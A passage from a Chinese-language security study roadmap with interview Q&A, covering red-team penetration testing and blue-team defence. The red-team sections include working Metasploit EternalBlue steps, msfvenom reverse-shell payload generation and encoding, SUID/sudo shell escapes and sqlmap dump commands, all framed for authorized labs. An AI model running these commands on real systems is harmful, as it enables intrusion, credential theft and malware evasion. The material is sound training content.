sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# 2. 查可提权面：SUID 文件 + sudo 权限
find / -perm -4000 -type f 2>/dev/null
sudo -l

# 3. 最小权限原则：Web 目录属主不是 root
chown -R www:www /var/www/html
```

**⑤ 实战任务**
- 在自己测试机执行上面的加固命令，确认 SSH 不能用密码登录
- 在靶机（如 Linux 提权靶场）用 `sudo -l` 和 SUID 查找，尝试完成一次提权（仅授权环境）
- 写一份"新服务器上线安全基线检查清单"（10 条以上），对照自己机器逐条检查

**⑥ 面试考点**
- 问：Linux 提权有哪些常见思路？
- 答：SUID 文件利用、sudo 配置错误、内核漏洞（脏牛）、可写计划任务、弱口令切用户；先 `id`、`sudo -l`、找 SUID 做信息收集
- 问：新服务器上线要做哪些安全加固？
- 答：禁用 root 远程登录、SSH 密钥认证、最小化服务、关闭多余端口、更新补丁、日志审计、防火墙规则、备份策略

## 第三阶段：红队攻防（渗透测试）约 6 个知识点

> 安全提醒：本阶段所有工具与手法只在授权靶场（DVWA/sqli-labs/pikachu/TryHackMe/HTB）和授权测试目标上使用，未授权渗透违法。

### 知识点 1：信息收集（打点前的功课）

**① 一句话本质**
信息收集 = 在攻击前把目标"摸清楚"——域名、IP、端口、指纹、人员、技术栈，收集得越全，后面打点越容易，这一步占渗透成功的一半。

**② 生活类比**
入室盗窃的"踩点"：先看楼门几扇、几层、窗户有没有关、有没有监控、几点有人——情报决定方案。渗透同理，信息收集决定攻击路线。

**③ 原理详解**
- 收集哪些信息（五类）
  - 域名：主域名、子域名（越多越好，子域名常有没人管的资产）
  - IP：真实 IP、CDN 背后的源站 IP
  - 端口/服务：哪些端口开放、跑什么服务（攻击面）
  - 指纹：Web 框架（ThinkPHP/Spring）、中间件（Nginx/Apache/Tomcat）、CMS（WordPress/Discuz）
  - 信息泄露：GitHub 泄露代码、历史漏洞、备案信息、证书信息
- 常用手段
  - 子域名：subfinder、OneForAll、证书透明度日志（crt.sh）
  - 端口：nmap 全套（-sS 半开扫描、-sV 版本探测、-A 全面）
  - 指纹：whatweb、Wappalyzer、云悉指纹
  - 资产测绘：FOFA、Quake、鹰图（搜"暴露的资产"，如开放的 Redis、未授权的 Nacos）
  - 被动收集（不留痕）：Google Hacking（site:、inurl:、filetype:）
- 思路：先"广撒网"（子域名/端口全扫）再"重点突破"（找高危服务、未授权访问、历史漏洞）

**④ 命令/代码示例**
```bash
# 1. 子域名枚举
subfinder -d example.com -all

# 2. 端口与服务版本扫描（核心命令）
nmap -sS -sV -p- -A example.com
nmap -sV -p 80,443,3306,6379,8080 target

# 3. Web 指纹识别
whatweb http://example.com

# 4. 查证书透明日志（找更多子域名）
curl "https://crt.sh/?q=example.com&output=json" | jq '.[].name_value' | sort -u
```

**⑤ 实战任务**
- 对本地靶场（DVWA）完成一轮信息收集：nmap 扫端口、whatweb 识别框架
- 用 subfinder 对自己公司/学校域名做子域名枚举（仅授权目标），收集结果整理成资产表
- 在 FOFA/Quake 上搜索一个公开的测试目标（如 CVE 演示靶场），观察其暴露的服务

**⑥ 面试考点**
- 问：信息收集有哪些方法？
- 答：分主动（nmap、whatweb、子域枚举）和被动（证书日志、FOFA 测绘、Google Hacking、GitHub 泄露）；先被动后主动
- 问：遇到 CDN 怎么找真实 IP？
- 答：查历史 DNS（securitytrails）、子域名（常有未套 CDN 的）、邮件头（发件服务器 IP）、SSL 证书关联 IP

### 知识点 2：Web 渗透工具化实战（sqlmap / Burp / 目录扫描）

**① 一句话本质**
第二阶段学了漏洞原理，这里把它"工具化"——Burp Suite 抓包改包（渗透的瑞士军刀）、sqlmap 自动化注入、dirsearch 扫目录，手工懂原理 + 工具提效率。

**② 生活类比**
手工注入像自己一刀刀切菜（懂原理），sqlmap 像自动切菜机（快但要知道怎么用）；Burp 像"安检透视仪"，所有进出流量都能拦截和修改。

**③ 原理详解**
- Burp Suite（必会，渗透第一工具）
  - Proxy 代理：浏览器流量经它转发，可拦截、修改、重放
  - Repeater：手工改包重放（调试 SQL 注入、越权必备）
  - Intruder：爆破（密码、目录、参数枚举）
  - 浏览器设置代理 127.0.0.1:8080，装证书后 HTTPS 也能抓
- sqlmap（SQL 注入自动化）
  - 检测 → 列库 → 列表 → 列字段 → 脱数据，一条龙
  - 配合 Burp：把抓到的请求存成文件，sqlmap -r request.txt
- 目录扫描
  - dirsearch、dirb：跑字典找隐藏路径（后台、备份文件、.git 泄露）
  - 常见宝藏：/admin、/backup.zip、/web.config、/.git/、/phpinfo.php
- 典型利用链（组合拳）
  - 目录扫描发现 /backup.zip → 下载解压拿到源码 → 代码审计找 SQL 注入 → sqlmap 脱库 → 找后台弱口令 → getshell

**④ 命令/代码示例**
```bash
# sqlmap 用 Burp 抓的包跑（最实用）
sqlmap -r login_request.txt --batch --level=2 --risk=2

# sqlmap 直接打 URL
sqlmap -u "http://target/news.php?id=1" --dbs
sqlmap -u "http://target/news.php?id=1" -D newsdb --tables

# 目录扫描
dirsearch -u http://target -e php,txt,bak,zip -x 403
```

**⑤ 实战任务**
- 用 Burp 抓一次 DVWA 登录请求，在 Repeater 里改成 SQL 注入 payload 重放
- 用 sqlmap -r 对抓到的注入点跑一遍，对照第二阶段手工注入的结果
- 用 dirsearch 扫一个靶场，找出隐藏的后台和备份文件

**⑥ 面试考点**
- 问：Burp Suite 主要功能？
- 答：代理抓包改包（Proxy）、重放（Repeater）、爆破（Intruder）、配合 sqlmap（-r 导入请求）
- 问：sqlmap 脱库的完整命令链？
- 答：--dbs 列库 → -D 库 --tables 列表 → -T 表 --columns 列字段 → -C 字段 --dump 脱数据

### 知识点 3：Metasploit（MSF）漏洞利用框架

**① 一句话本质**
Metasploit = 漏洞利用的"工具箱+弹药库"——内置几千个现成漏洞利用模块（exploit）和载荷（payload），选对目标、选对模块、一发入魂，是渗透测试和红队演练的核心工具。

**② 生活类比**
它像一个万能工具箱：里面有撬锁器（exploit 利用模块）、各种钥匙模子（payload 载荷）、还有"安装后门"的小零件——你只需要找到匹配的锁（漏洞）和钥匙（payload）。

**③ 原理详解**
- 核心概念（背熟）
  - exploit：漏洞利用模块（如 ms17_010_eternalblue 永恒之蓝）
  - payload：利用成功后执行的代码（如反弹 shell）
  - LHOST/LPORT：攻击者（你）的 IP 和端口（payload 要连回来）
  - RHOST/RPORT：目标 IP 和端口
- 基本流程
  - 找模块：`search 关键词`（如 `search eternalblue`）
  - 用模块：`use exploit/windows/smb/ms17_010_eternalblue`
  - 设参数：`set RHOSTS 目标IP`、`set LHOST 你的IP`、`set LPORT 4444`
  - 跑：`run` 或 `exploit` → 成功拿到 meterpreter shell
- msfvenom：单独生成 payload（不依赖 msfconsole）
  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f exe -o shell.exe`
  - 生成后要传到目标上执行（钓鱼/文件上传/命令执行）
- 拿到 shell 后的常用命令（meterpreter）
  - `getuid` 看当前用户、`sysinfo` 看系统、`shell` 进系统命令行
  - `upload`/`download` 传文件、`getsystem` 尝试提权、`run post/...` 后渗透模块
- 注意点：MSF 的公开 exploit 常被杀软查杀，需要免杀（见知识点 6）；先打容易打的（未打补丁的系统）

**④ 命令/代码示例**
完整利用流程（靶场演示，仅授权环境）：
```
msfconsole
search ms17_010                        # 找永恒之蓝模块
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100              # 目标
set LHOST 192.168.1.50                # 你的 IP
set LPORT 4444
run                                    # 成功 → meterpreter shell
```

生成反弹 shell 载荷：
```bash
# 生成 Windows 反弹 shell（配合钓鱼/上传到目标）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# 攻击机先监听，目标一执行 shell.exe 就连回来
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
```

**⑤ 实战任务**
- 在本地搭 Windows 7 虚拟机靶机（打补丁前版本），用永恒之蓝模块完整跑通一次"扫描→利用→拿 shell"
- 用 msfvenom 生成一个 payload，配合本地监听（multi/handler）验证反弹 shell 流程
- 熟练 meterpreter 的常用命令（getuid/sysinfo/shell/upload/download）

**⑥ 面试考点**
- 问：exploit 和 payload 的区别？
- 答：exploit 是触发漏洞的模块（怎么打进去），payload 是进去后执行的代码（打进去干什么）
- 问：反弹 shell 的原理？
- 答：目标主动连回攻击机的 IP:端口（绕过防火墙入站限制），攻击机用 multi/handler 监听等待连接
- 问：拿到 shell 后第一件事做什么？
- 答：先收集信息：getuid 当前权限、sysinfo 系统版本、网络情况、杀软情况，再决定提权路线

### 知识点 4：提权（Linux / Windows）

**① 一句话本质**
提权 = 从低权限（普通用户/Web 权限）升级到高权限（root/System）——拿 shell 只是第一步，提权成功才算真正控制机器。

**② 生活类比**
你混进大楼只拿到一张访客卡（普通权限），电梯只能到 3 楼；提权就是找到"能刷开 12 楼机房"的管理员卡（root）——可能是前台没锁的卡盒（SUID）、或领导桌上忘收的卡（弱口令）。

**③ 原理详解**
- 提权前信息收集（决定路线）
  - `id` 看当前用户、`uname -a` 看内核版本
  - `sudo -l` 看能免密执行什么命令
  - `find / -perm -4000` 找 SUID 文件
  - 看有没有可利用的服务/计划任务/内网凭据
- Linux 提权五大方向（背熟）
  - SUID 提权：root 所有的 SUID 文件（find/vim/bash）可利用
    - `find / -perm -4000 -type f` 后逐个试
  - sudo 配置错误：`sudo -l` 显示可免密执行的命令，利用它提权
    - 例：`sudo find / -exec sh \;` 以 root 执行 shell
  - 内核漏洞：脏牛（Dirty COW CVE-2016-5195）等，打补丁即可防
  - 计划任务：root 定时执行的脚本可写 → 写反弹 shell 进去
  - 弱口令/明文凭据：历史命令、配置文件里找密码
- Windows 提权方向
  - 内核漏洞：MS17-010（永恒之蓝）、Potato 系列（烂土豆）
  - 服务配置：服务路径带空格且目录可写（PATH 劫持）
  - AlwaysInstallElevated：MSI 以 System 权限安装
  - 凭据抓取：mimikatz 抓内存明文密码/哈希（如果权限够）
- 防御（加固即防提权）
  - 及时打内核/系统补丁、收紧 SUID 与 sudo 配置、服务最小权限运行、监控提权行为

**④ 命令/代码示例**
Linux 提权三板斧（信息收集）：
```bash
id                                    # 当前用户/组
uname -a                              # 内核版本（查对应漏洞）
sudo -l                               # 能免密执行什么
find / -perm -4000 -type f 2>/dev/null # SUID 文件
cat /etc/crontab                      # 计划任务（看有没有可写的）
cat /etc/passwd                       # 有没有可疑高权限用户
history                               # 历史命令里的密码
```

SUID 经典利用（靶场演示）：
```bash
# 如果 find 带 SUID 且属主 root，直接提权
find . -exec sh -p \; -quit
```

**⑤ 实战任务**
- 在 Linux 提权靶场（如 TryHackMe 的 Linux PrivEsc 房间），按"信息收集→找 SUID/sudo→利用"完整跑一遍
- 在 Windows 7 靶机，用 ms17_010 或 Potato 类模块体验 Windows 提权
- 写一份"提权信息收集检查清单"（Linux 版 8 条以上）

**⑥ 面试考点**
- 问：Linux 提权思路？
- 答：先信息收集（id/uname/sudo -l/SUID），再看五类方向：SUID、sudo 错配、内核漏洞、可写计划任务、弱口令/凭据
- 问：sudo -l 显示可执行 vim/find 怎么提权？
- 答：vim 用 `:!sh` 进 shell；find 用 `-exec sh \;` 执行命令——前提是 sudo 配置允许
- 问：拿到 shell 权限不高怎么继续？
- 答：信息收集找提权面（见上），同时收集内网信息为横向做准备；拿不到 root 就先横向

### 知识点 5：内网渗透（横向移动与域渗透）

**① 一句话本质**
外网只是"门卫"，内网才是"大楼"——拿到一台机器只是开始，内网渗透是通过这台机器当跳板，横向摸清整个内网、找到核心目标（数据库、域控）。

**② 生活类比**
你混进大楼拿了张 3 楼的门禁卡（拿下一台机器），接下来要：看大楼图纸（内网拓扑）→ 挨个房间试卡（横向移动）→ 找到最值钱的房间——财务室/机房（核心资产/域控）。

**③ 原理详解**
- 内网信息收集（第一件事）
  - `ipconfig /all` / `ip a` 看网段，`arp -a` 看活跃主机
  - 路由表、DNS、共享、域环境判断（`net time /domain`）
  - 扫描内网：fscan（内网神器，快）、nmap
- 代理穿透（为什么需要）
  - 外网到不了内网，需要通过已控主机做跳板
  - 工具：frp（正向/反向代理）、NPS、metasploit 的路由、Cobalt Strike 的 beacon
  - frp 反向代理：把内网端口"映射"到攻击机，直接访问内网服务
- 横向移动（从 A 到 B）
  - 凭据收集：mimikatz 抓内存密码哈希、浏览器保存的密码、共享中的文件
  - PTH（Pass-the-Hash）：有 NTLM 哈希即可冒充登录，不用明文密码
  - 经典漏洞：MS17-010 永恒之蓝（内网横向神器）、SMB 漏洞
  - 利用共享/计划任务/RDP 横向
- 域渗透（企业内网核心）
  - 域控（DC）是内网最高权限，拿下域控=控制全网
  - Kerberoast：抓服务账号的哈希离线爆破
  - 黄金票据/白银票据：伪造 Kerberos 票据冒充任意用户（需拿到 krbtgt 哈希）
- 防御：隔离内网、最小权限、监控横向行为（异常登录/异常 SMB）、域控重点防护

**④ 命令/代码示例**
内网信息收集（拿到 shell 后）：
```bash
# Windows 上
ipconfig /all
arp -a
net user
net localgroup administrators

# Linux 上
ip a; cat /etc/hosts; cat /etc/passwd
```

fscan 内网快速扫描（授权内网测试）：
```bash
fscan -h 192.168.1.0/24            # 扫整段网段
fscan -h 192.168.1.1-200          # 扫范围
# 输出：存活主机、端口、服务、弱口令（自动探测）
```

**⑤ 实战任务**
- 搭一个小型内网环境（两台虚拟机），用 frp 做代理穿透，从"外网"访问内网 Web 服务
- 在靶场环境用 fscan 扫内网，找出存活主机和弱口令（仅授权）
- 学习 mimikatz 抓取凭据，理解 PTH 的原理（在实验机，理解后清场）

**⑥ 面试考点**
- 问：什么是横向移动？
- 答：拿到内网一台机器后，利用收集的凭据/漏洞，在网内一台台"横向"扩大控制范围，最终到达核心目标（数据库/域控）
- 问：为什么需要代理穿透？
- 答：外网无法直连内网，把已控主机当跳板，把内网端口映射/路由到攻击机，才能访问和利用内网服务
- 问：域渗透的最终目标是什么？
- 答：拿下域控（DC）——它是全网最高权限，控制它等于控制整个域内所有机器

### 知识点 6：免杀与对抗（了解为主）

**① 一句话本质**
免杀 = 让恶意文件/流量"骗过杀毒软件和 EDR"——生成式 shell 一落地就被查杀，免杀是为了"活下来"，是红队对抗的核心技术，也是普通安全工程师最少接触的部分。

**② 生活类比**
小偷的工具如果长得像普通扳手（伪装），保安（杀软）就不会多看一眼；免杀就是给攻击载荷"整容"，让它看着像正常程序。

**③ 原理详解**
- 杀软为什么能查杀
  - 特征码匹配：病毒库里的已知特征（payload 指纹）
  - 行为检测：沙箱跑一遍看行为（连外、写自启动、注入）
  - 静态分析：查壳、查签名、查熵值（加密的可疑）
  - EDR 更强：内存检测、进程注入检测、行为链分析
- 常见免杀思路（了解为主，不深入）
  - 编码混淆：Base64/XOR 编码 payload（过简单特征检测）
  - 分离免杀：shellcode 与加载器分离，落地文件不含特征
  - 加载器技术：白名单进程加载（powershell/rundll32）、内存加载
  - 加壳/加密：upx 壳、自定义加密壳
  - 改变特征：替换 payload 的固定字符串、修改源码特征
  - 注意：免杀更新快、查杀也在升级，公开手法很快失效
- 对抗本质：攻击者与防御者在"检测技术"上不断升级，没有一劳永逸的免杀

**④ 命令/代码示例**
了解 shellcode 编码概念（不实际攻击）：
```bash
# msfvenom 的编码选项（了解存在，实际免杀需更复杂手段）
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai \
  LHOST=1.2.3.4 LPORT=4444 -f exe -o shell.exe

# 查看文件熵值/签名（杀软看特征的手段）
file shell.exe
```

**⑤ 实战任务**
- 用 msfvenom 生成一个原始 payload，上传到 VirusTotal 看查杀率（学习"被杀"是什么概念）
- 阅读 1-2 篇公开的免杀原理文章（分离免杀、加载器），画出"免杀对抗"的攻防关系图

**⑥ 面试考点**
- 问：杀毒软件是怎么工作的？
- 答：特征码匹配（静态）、行为检测（沙箱/行为链）、内存/进程检测（EDR）；各有侧重
- 问：常见免杀思路？
- 答：编码混淆、分离加载、白名单进程加载、加壳加密、特征修改——了解为主，重点是知道"对抗在升级、没有永久的免杀"

## 第四阶段：蓝队防护（安全运维方向）约 5 个知识点

### 知识点 1：安全设备与产品（防火墙 / WAF / IDS / HIDS / SIEM）

**① 一句话本质**
安全设备 = 一层层的"安检关卡"：防火墙守大门（网络层）、WAF 检查包裹内容（Web 层）、IDS/IPS 看行为（入侵检测）、HIDS 盯内部人员（主机层）、SIEM 汇总所有监控（指挥中心）。

**② 生活类比**
大楼安保体系：大门口闸机（防火墙，只管进出的"人和门"）、X 光安检机（WAF，专门检查包裹里有没有武器）、大厅巡逻保安（IDS，看到可疑行为就上报）、每个房间的监控（HIDS，盯着内部一举一动）、中央监控室（SIEM，把所有摄像头和报警汇总到一块屏）。

**③ 原理详解**
- 防火墙（网络边界第一道）
  - 作用：按 IP/端口/协议放行或拦截流量
  - 类型：包过滤（五元组）、状态检测（记住连接状态）、下一代防火墙 NGFW（带应用识别+IPS）
  - 局限：拦不住 Web 应用层攻击（SQL 注入用 80 端口正常进入）
- WAF（Web 应用防火墙）
  - 作用：专门防 Web 攻击：SQL 注入、XSS、CC 攻击、恶意爬虫
  - 实现：规则库（OWASP 规则）、语义分析、云 WAF（如阿里云 WAF）
  - 局限：规则可绕过，需要持续更新；配合"日志分析"一起看
- IDS / IPS（入侵检测/防御）
  - IDS：旁路监听，发现攻击"报警"（不拦）
  - IPS：串联在链路上，发现攻击"直接拦截"
  - 代表：Snort、Suricata（开源）、厂商设备
  - 检测方式：特征签名（已知攻击）、异常行为（基线偏离）
- HIDS（主机入侵检测）
  - 作用：装在每台服务器上，盯进程、文件、登录、命令
  - 代表：Wazuh（开源，运维可自己搭）、阿里云安骑士/云锁
  - 能力：webshell 检测、异常登录告警、文件完整性监控（Tripwire）
- SIEM（安全信息与事件管理）
  - 作用：把防火墙/WAF/HIDS/日志全部汇总，统一检索、关联分析、告警
  - 代表：Splunk、IBM QRadar、Elastic Stack（开源方案）
  - 你的优势：你熟 ELK（Elastic Stack），搭 SIEM 天然对口

**④ 命令/代码示例**
开源方案快速体验（Ubuntu 上装 Suricata）：
```bash
# 安装 Suricata IDS
sudo apt install suricata
sudo suricata-update              # 更新规则库

# 检查配置，开始监听 eth0
sudo suricata -i eth0

# 看告警日志（发现攻击会写到这里）
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

**⑤ 实战任务**
- 在自己服务器装 Suricata，用 nmap 扫自己机器，观察 IDS 是否报"端口扫描"告警
- 体验 Wazuh 或 ELK：接入一台服务器日志，配置一条"多次失败登录"告警规则
- 画一张"公司网络：防火墙→WAF→交换机镜像→SIEM"的部署示意图

**⑥ 面试考点**
- 问：WAF 和防火墙的区别？
- 答：防火墙管网络层（IP/端口），WAF 管应用层（Web 攻击）；SQL 注入走 80 端口防火墙放行但 WAF 能拦
- 问：IDS 和 IPS 的区别？
- 答：IDS 旁路只报警不拦截，IPS 串联直接拦截；IPS 误报会断业务，所以上线前要调规则
- 问：怎么检测 webshell？
- 答：HIDS 文件监控 + WAF 流量特征 + 日志异常（上传行为）+ 人工审计

### 知识点 2：日志分析与异常检测

**① 一句话本质**
日志是"案发现场的监控录像"——谁在什么时候从哪来干了什么，全在日志里；蓝队日常工作就是翻录像找可疑行为，入侵后的溯源也靠它。

**② 生活类比**
物业半夜接到报警，保安第一件事是调监控：电梯几点有人、从几楼出来、按了哪个房间——日志分析就是把系统的"监控录像"调出来，还原攻击者的每一步。

**③ 原理详解**
- 必看日志位置（Linux）
  - /var/log/auth.log 或 /var/log/secure：登录记录（最核心）
  - /var/log/messages / syslog：系统消息
  - /var/log/nginx/access.log：Web 访问日志
  - /var/log/cron：计划任务执行
  - last / lastb / w：登录历史、失败登录、在线用户
- 异常检测四板斧（背熟）
  - 异常登录：凌晨/异地登录、root 直接登录、连续失败后成功
  - 异常进程：CPU 飙高（挖矿）、名字伪装（系统进程改名）、外连陌生 IP
  - 异常文件：/tmp 下的可疑文件、新增的用户、后门文件
  - 异常外连：服务器主动连外部陌生 IP（反弹 shell、挖矿、数据外传）
- Web 日志分析要点
  - 扫描特征：大量 404、快速换 UA、一个 IP 疯狂请求
  - 攻击特征：URL 里带 sqlmap/union/select、XSS payload、上传文件后缀
  - webshell 痕迹：访问后台上传的文件、POST 大量数据
- 分析工具
  - 命令行：grep/awk/sort/uniq（你的强项）
  - 集中分析：ELK（Logstash 采集 + Kibana 检索）、GoAccess（Web 日志可视化）

**④ 命令/代码示例**
一条命令找出爆破攻击者（Linux）：
```bash
# 统计失败登录最多的 IP（前 10）
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

# 统计 Web 日志里访问最多的 IP（找扫描源）
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -10

# 看最近登录记录与当前在线
last -20
who

# 找 /tmp 下最近的可疑文件
find /tmp -type f -mtime -3 2>/dev/null
```

**⑤ 实战任务**
- 对自己机器用 `grep "Failed password"` 分析：有没有被爆破？攻击者 IP 是谁？
- 用 nmap 扫自己机器后，在 Web 日志/Suricata 日志里找出"扫描痕迹"
- 把日志接入 ELK，练习用 Kibana 检索"某 IP 过去 24 小时的所有访问"

**⑥ 面试考点**
- 问：怎么判断服务器被入侵？
- 答：异常登录（异地/凌晨/失败后成功）、异常进程与 CPU、可疑文件（/tmp、新增用户）、异常外连、Web 日志有 webshell 访问记录
- 问：日志被删了还能溯源吗？
- 答：看有没有外置日志（SIEM/ELK 集中采集）、防火墙/WAF 设备日志、业务数据库操作记录；所以日志一定要集中保存+只读
- 问：Web 日志里怎么看扫描攻击？
- 答：单一 IP 短时间大量 404、UA 是扫描器特征（sqlmap/nmap）、URL 带注入/上传特征

### 知识点 3：应急响应（勒索 / 挖矿 / webshell / DDoS）

**① 一句话本质**
应急响应 = 服务器出事后"先止损、再取证、后恢复"的一套标准动作——不求当场破案，先控制损失、保住证据，再还原攻击过程、修补漏洞。

**② 生活类比**
家里进贼了：先锁门关窗防贼再跑（止损）→ 保护现场拍照（取证）→ 清点损失、换锁加固（恢复与加固）→ 报警分析怎么进来的（溯源）。顺序不能反——先抢着收拾现场反而破坏证据。

**③ 原理详解**
- 应急响应标准流程（五步，背熟）
  - 隔离：断网/关服务/停进程，防止扩散（但保留现场）
  - 取证：拷贝内存/进程列表/日志/可疑文件（先备份再动）
  - 分析：还原入侵路径，确认影响范围
  - 清除：杀进程、删后门、清自启动
  - 恢复加固：打补丁、改密码、补日志、防二次入侵
- 勒索病毒处置（常见场景）
  - 现象：文件被加密（.lock 后缀）、桌面弹勒索信、要比特币
  - 处置：立即断网隔离（防全网加密）→ 保留被加密样本和勒索信（取证）→ 检查有无备份可恢复 → 溯源入口（常是 RDP 弱口令/钓鱼）→ 加固
  - 关键：事前备份是唯一解药；事后"付赎金"不保证给解密
- 挖矿木马清除（高频）
  - 现象：CPU 100%、进程名怪（kdevtmpfsi 等）、外连矿池 IP
  - 处置：top 找进程 → 看 /proc/PID 确认 → kill + 删文件 → 清自启动（crontab/systemd）→ 查入侵源（常是 Redis 未授权/Webshell）→ 加固
- webshell 排查
  - 找：文件落地（时间戳+内容特征 `eval($_POST`）、访问日志（上传点/后门访问）
  - 处置：删文件 → 补上传漏洞 → 排查是否留了后门账号/其他 webshell
- DDoS 应急
  - 现象：带宽打满、服务不可用、来源 IP 海量
  - 处置：云厂商高防/DDoS 清洗、限速限流（nginx limit_req）、封异常 IP、扩容
  - 事前：接入高防、CDN 抗量、限流预案

**④ 命令/代码示例**
应急响应一键收集信息（快速取证）：
```bash
# 1. 当前时间与运行时长（重启会丢线索）
date; uptime

# 2. 在线用户与登录记录
who; last -20

# 3. 异常进程（CPU/内存 TOP）
top -b -n 1 | head -20

# 4. 网络连接（找外连可疑 IP）
ss -antp | grep ESTAB

# 5. 自启动项（找持久化后门）
cat /etc/crontab; ls -la /etc/cron.*/ /etc/init.d/ | head

# 6. 新增/可疑用户
grep -v nologin /etc/passwd

# 7. 最近修改的文件（webshell 常刚落地）
find /var/www -type f -mtime -3 2>/dev/null
```

**⑤ 实战任务**
- 在靶场放一个"挖矿木马"（脚本模拟），练习完整处置：找进程→杀→清自启动→写处置报告
- 用 DVWA 上传一个 webshell，然后从日志和文件两个角度排查它（演练蓝队视角）
- 写一份《服务器入侵应急响应手册》模板（五步流程+命令+记录表）

**⑥ 面试考点**
- 问：应急响应的流程是什么？
- 答：隔离→取证→分析→清除→恢复加固（先止损、保证据、再溯源）；过程中记录时间线
- 问：服务器被挖矿了怎么处置？
- 答：top 找进程→杀进程删文件→清自启动→查入侵入口（Redis 未授权/弱口令/webshell）→打补丁加固→监控是否复发
- 问：勒索病毒怎么防？
- 答：备份（3-2-1 原则）+ 弱口令治理（禁 RDP 公网暴露）+ 补丁 + 安全意识（防钓鱼）+ 隔离网段

### 知识点 4：威胁情报与溯源反制

**① 一句话本质**
威胁情报 = "坏人数据库"——IP/域名/样本/攻击手法的情报共享，让防御从"被动等报警"变成"主动拦截已知坏人"；溯源则是用日志+情报把攻击者挖出来。

**② 生活类比**
小区物业建了个"惯犯相册"：哪个小偷长什么样、爱偷哪栋楼（情报库），保安看到相册里的人进来直接盯上（主动防御）；出了事还能从相册里认出是谁（溯源）。

**③ 原理详解**
- 威胁情报是什么
  - IOC（失陷指标）：恶意 IP、恶意域名、文件哈希、C2 地址
  - 类型：战略情报（行业态势）、战术情报（攻击者手法 TTP）、操作情报（IOC）
  - 使用：防火墙/WAF/SIEM 拉情报库，匹配到就告警/拦截
- 常用情报源
  - 在线平台：微步在线（ThreatBook）、奇安信威胁情报中心、VirusTotal、AlienVault OTX
  - 免费情报：AbuseIPDB（查 IP 信誉）、urlscan（查 URL 行为）
  - 自查：`curl ifconfig.me` 看本机出口 IP，在 AbuseIPDB 查是否被标记
- 溯源思路（从日志还原攻击者）
  - 入口溯源：登录日志、Web 日志、漏洞利用痕迹
  - 时间线还原：入侵入口 → 提权 → 后门 → 横向 → 数据外传，每一步找证据
  - 反查：攻击者 IP → 情报库查历史行为 → 指纹（UA/工具特征）关联同一攻击者
  - 样本分析：恶意文件扔沙箱（微步云沙箱/VirusTotal）看行为和 C2
- 注意：溯源不等于"抓人"，企业里溯源目的是"查清影响、修补漏洞"，执法移交是后话

**④ 命令/代码示例**
```bash
# 查一个 IP 的信誉（AbuseIPDB 网页/API）
curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=8.8.8.8" \
  -H "Key: 你的APIKey" -H "Accept: application/json"

# 日志里提取攻击者 IP 去查情报
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort -u

# 本机对外连接里找可疑外连（可能已失陷）
ss -antp | grep -v "127.0.0.1" | awk '{print $5}' | sort -u | head -20
```

**⑤ 实战任务**
- 把自己服务器的公网 IP 拿到 AbuseIPDB 查一次信誉，看看有没有被标记
- 从 auth.log 提取攻击者 IP 列表，逐个到威胁情报平台查历史行为
- 做一个"恶意样本分析"：生成一个无害的测试文件（如 msfvenom payload 的 exe），扔微步云沙箱观察行为报告

**⑥ 面试考点**
- 问：威胁情报怎么落地？
- 答：拉 IOC 进防火墙/WAF/SIEM 自动匹配拦截；日常在情报平台查可疑 IP/样本；分享自己发现的 IOC
- 问：怎么溯源一次攻击？
- 答：以日志为主线：入口（登录/漏洞）→ 提权 → 持久化 → 横向 → 外传，逐环节找证据，结合威胁情报反查 IP/指纹，样本进沙箱分析

### 知识点 5：等级保护 2.0（合规必懂）

**① 一句话本质**
等保 = 国家强制要求"重要系统按等级做安全防护"——系统按重要程度分 1-5 级，每级有一份"必做安全清单"（测评标准），不做等于违规。

**② 生活类比**
消防验收：大楼按用途和规模定"消防等级"，等级越高要求越严（灭火器数量、逃生通道、烟感探头）；等保就是"信息系统的消防验收"——定了级，就要按标准整改，不达标不给过。

**③ 原理详解**
- 等保 2.0 五步流程（背熟）
  - 定级：按系统重要程度定 1-5 级（一般定 2 级，重要系统 3 级）
  - 备案：到公安部门备案
  - 建设整改：按等级要求补安全措施
  - 等级测评：找测评机构测评（第三方）
  - 监督检查：公安机关定期检查
- 等级划分（1-5 级）
  - 一级：普通企业系统（自主保护）
  - 二级：一般企事业单位（指导保护），多数系统在此
  - 三级：重要系统（金融机构、政府核心、大型互联网），监管重点
  - 四级/五级：极重要系统（国家关键信息基础设施）
- 等保 2.0 核心内容（三同步 + 十个方面）
  - 三同步：安全设施与系统"同步规划、同步建设、同步运行"
  - 技术层面：安全物理环境、通信网络、区域边界、计算环境、管理中心
  - 管理层面：安全管理制度、管理机构、人员、建设、运维
  - 具体常见项：防火墙、WAF、日志留存（≥6 个月）、备份、审计、密码复杂度、双因素
- 对你的意义：合规岗位需求大；等保整改落地很多是"运维+安全"的活（加固、日志、备份），你转型蓝队后最常接触

**④ 命令/代码示例**
等保整改中运维侧常做的检查项：
```bash
# 1. 口令策略（等保要求：密码复杂度+定期更换）
grep -E "PASS_MAX_DAYS|PASS_MIN_LEN" /etc/login.defs

# 2. 日志是否开启并留存（要求 ≥6 个月）
grep -v "^#" /etc/rsyslog.conf | grep -i auth

# 3. 是否启用防火墙（等保基本要求）
systemctl status firewalld

# 4. 审计（syslog 集中、权限收紧）
```

**⑤ 实战任务**
- 把自家/工作系统对照等保 2.0 二级要求，写一份"差距清单"（哪些达标哪些缺）
- 了解你所在公司系统的定级备案情况，画出"定级→备案→整改→测评→检查"的流程图
- 阅读等保 2.0 三级技术要求中的"安全计算环境"部分，摘出 10 条落地项

**⑥ 面试考点**
- 问：等保 2.0 的流程？
- 答：定级→备案→建设整改→等级测评→监督检查（五步）
- 问：等保 2.0 和 1.0 的区别？
